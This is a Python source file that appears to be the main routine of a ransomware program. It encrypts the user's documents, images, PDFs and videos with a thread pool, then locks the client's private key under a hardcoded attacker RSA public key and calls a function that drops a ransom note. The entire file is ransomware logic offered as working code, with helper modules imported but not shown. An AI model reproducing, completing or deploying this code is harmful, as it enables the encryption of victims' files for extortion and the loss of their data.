from filelocker import FileLocker
from keylocker import KeyLocker
from getfiles import getFiles
from Crypto.PublicKey import RSA
from ransomnote import dropnote
from concurrent.futures import ThreadPoolExecutor
import time


def fileEncrypt(file):
    x = FileLocker(file[0])
    x.encrypt(file[-1])


if __name__ == "__main__":

    #Initialize Asymmetric Encryptor
    ckeylocker = KeyLocker()
    #Create the folder for the Client Assymetric Keys
    ckeylocker.generate_folderkey()
    #Generate them ASYM keys
    ckeylocker.generate_keys()

    #With threading
    start = time.perf_counter()
    with ThreadPoolExecutor(max_workers=10) as exec:
        exec.map(fileEncrypt, map(lambda x:(x,ckeylocker),getFiles([".jpg",".txt",".docx",".doc",".pdf",".mp4"])))
    end = time.perf_counter()
    print("Finished in: "+str(end-start))

    #Without Threading
    # for file in getFiles([".jpg",".txt",".docx",".doc",".pdf",".mp4"]):
    #     x = FileLocker(file)
    #     x.encrypt(ckeylocker)

    #A new Assymetric encrpytor for Client's Private key
    skeylocker = KeyLocker()
    skeylocker.key=RSA.import_key(b'-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0/lEgfJbsyXN7Ro4QFAK\npLsoogmT3NjslPg0TH6LqqvxiUYJGZBzxctDwueiiYB91OBfpGkxn160a0tDLsky\neXq7/aNwNxB5LmyddRyTgXlD9OluCyP+upbWFa8ZzcCYY02d1RxdZ5KwT3fdTzet\nRjcTUwJWIUQfiPTEtss3tiU19c8wVVvU14WzBnEumWqL5jf9/zSyt6HvD/t4SHuV\n9zO4+iaI9fh1LjtiC+4Pkh8fpwYjtfjkWOQeRH6rb3QFaG8gxsGilvVx9ONnZ1XQ\nFcNNeiTYdnhYVlXUsKdHwYsrjL1n4acr2cJ2y3IG3m0MDoOnuXR2HPVl8lOBt6PK\nbwIDAQAB\n-----END PUBLIC KEY-----')
    z = FileLocker(ckeylocker.key_path+"\\privb0n3r.pem")
    z.encrypt_key(ckeylocker,skeylocker)

    #dropnote
    dropnote()